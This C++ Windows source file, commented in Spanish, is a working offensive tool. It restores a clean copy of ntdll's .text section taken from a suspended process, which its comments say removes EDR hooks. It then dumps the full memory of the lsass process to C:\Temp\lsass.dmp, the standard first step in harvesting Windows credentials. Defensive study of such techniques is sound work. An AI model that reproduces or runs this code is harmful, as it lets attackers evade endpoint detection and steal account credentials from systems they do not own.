
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <iostream>
#include <limits>
#include "Source.h"
#include <psapi.h>
#include <DbgHelp.h>
#include <TlHelp32.h>

#pragma comment(lib, "dbghelp.lib")


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int filter(unsigned int code)
{
	if (code == EXCEPTION_STACK_OVERFLOW)
	{
		puts("Overflow\n");
		return EXCEPTION_EXECUTE_HANDLER;
	}
	else
	{
		puts("No se...\n");
		printf("Excepcion: %d\n", code);
		return EXCEPTION_EXECUTE_HANDLER;
	}
}

BOOL unhook(wchar_t * processName);


int wmain(int argc, wchar_t** argv)
{
	DWORD pId = 0;
	if (argc < 2)
	{
			return -1;
	}
	else
	{
		if (wcstoul(argv[1], NULL, 10) != 0) //Si el parametro primero es un numero intentamos dumpear directamente
			goto dumpea;
		if (!unhook(argv[1])) //Si no es un numero pues deshookeamos y luego dumpeamos
			return 0;
	}

	dumpea:
	if (argc == 3)
		pId = wcstoul(argv[2], NULL, 10);
	else
	{
		printf("No teastemos lsass\n");
		return 0;
	}
	printf("Testeando lsass\n");
	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pId);
	HANDLE outFile = CreateFile(L"C:\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, pId, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (isDumped)
		printf("Dumped yeah\n");
	return 1;
	

}
	


BOOL unhook(wchar_t *processName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	__try
	{

		BOOL hProcbool = CreateProcess(NULL, processName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);  /*
		Creamos un proceso suspendido que luego usaremos para leer su memoria y borrar los hooks de nuestro proceso*/
		
		HANDLE hProc = pi.hProcess;
		if (hProc == NULL)
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}

		PEB pPeb;
		PROCESS_BASIC_INFORMATION BasicInfo;

		DWORD dwSize = NULL;

		HMODULE hLibrary = GetModuleHandleW(L"ntdll.dll");
		if (NULL == hLibrary)
			return 0;
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi2 = {};
		GetModuleInformation(process, hLibrary, &mi2, sizeof(mi2));
		FARPROC fpNtQueryInformationProcess = GetProcAddress
		(
			hLibrary,
			"NtQueryInformationProcess"
		);

		if (!fpNtQueryInformationProcess)
			return 0;

		_NtQueryInformationProcess ntQueryInformationProcess =
			(_NtQueryInformationProcess)fpNtQueryInformationProcess;
		/*Information del proceso suspendido para sacar la direccion del PEB*/
		NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize); 
		
		if (!NT_SUCCESS(status))
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}
		unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
		SIZE_T bytesRead;
		/*Leo el PEB*/
		BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
		if (!bSuccess)
		{
			printf("Error: %d\n", GetLastError());
			throw EXCEPTION_STACK_OVERFLOW;
		}
		/*Con el PEB me quedo con el address de la base de la imagen*/
		LPVOID imageBase = pPeb.ImageBaseAddress;
		DWORD old;
		VirtualProtect(imageBase, sizeof(LPVOID), PAGE_READWRITE, &old);

		MEMORY_BASIC_INFORMATION basic;
		/*Me guardo el addr para luego poder iterar sobre el*/
		LPVOID addr = imageBase;
		char* buffer = new char[100];
		int contador = 1;
		/*Enumeramos las secciones del proceso*/
		while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
		{
			LPVOID oldaddr = addr;
			if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE) /*Si una seccion es de tipo imagen*/
			{
				delete[] buffer;
				buffer = new char[basic.RegionSize];
				/*Leemos la memoria de esa seccion*/
				bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
				if (!bSuccess)
				{
					printf("Error: %d\n", GetLastError());

					return 0;
				}
				for (unsigned int j = 0; j < bytesRead; j++)
				{
					/*Hay algun tramo de memoria con bytes magic de PE32*/
					if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
					{

						/*
						Si es el primer match es el propip PE del ejecutable, solo me guardo la dirección
						para saltar al final de esa dirección y ahorrarme leerlo entero
						*/
						if (contador == 1) 
						{
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
							/*Ahi ese donde saco el tamaño del PE32 para luego saltarmelo*/
							addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
							contador += 1;
							goto continuar;
						}
						/*Si es el segundo match es NTDLL.dll*/
						else
						{
							/*Si no fuese la primera posicion del iterador de la seccion, pues me reemplazo addr
							por addr mas iterador*/
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
							/*Operaciones con las estructuras PE32 para sacar el numero de secciones de la DLL y donde empieza
							en si la DLL y dicha seccion*/
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);


							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) //iteramos las secciones
							{
								//Sacamos el nombre de cada seccion
								PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
								//Si es la seccion text estamos de suerte
								if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
								{
									//Guardamos el tamaño de la seccion text
									unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
									//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
									unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
									addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
									//Comprobamos el tamaño de memoria que podemos leer de ahí, para que no de por saco
									VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
									delete[] buffer;
									/*En realidad si dumpeamos todo nos sobran 0x2000 bytes, he sido un manazas y he puesto 2000 sin más
									pero podemos ahorrarnos bastante memoria*/
									buffer = new char[basic.RegionSize - 2000];
									/*Leemos la seccion text de la dll del proceso suspendido*/
									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
									if (!bSuccess)
									{
										printf("Error reading the last: %d\n", GetLastError());
										return 0;
									}
									//Por motivos de debug si quieres puedes dumpearla ;) 
									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
									fwrite(buffer, bytesRead, 1, fp);
									fclose(fp);*/
									
									DWORD oldProtection, oldProtection2 = 0;
									/*
									Cambiamos el protect de esa zona para darnos permisos de escritura, y luego 
									finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
									mi DLL hookeada por el EDR*/
									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);
									memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
									isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, oldProtection, &oldProtection2);
									printf("Found section text\n");
									//Limpiamos
					
									delete[] buffer;
									return 1;
								}
							}
							printf("Sacamos la header\n");
						}

						contador += 1;
					}
				}

			}
		continuar:
			/*En el primer match del iterador (primera cabecera PE encontrada) hemos reemplazado el addr, asi que noo nos hace falta sumarle nada mas,
			por eso comprobamos si oldaddr == actual_addr, para saber si hace falta iterarlo o no*/
			if ((unsigned long long)oldaddr == (long long)addr)
				addr = LPVOID((unsigned long long)addr + (unsigned long long)basic.RegionSize);

		}
	}
	__except (filter(GetExceptionCode())) /*Evitamos posibles overflows XD*/
	{
		std::cout << "Error convirtiendo datos\n";
		return 0;
	}
		
}
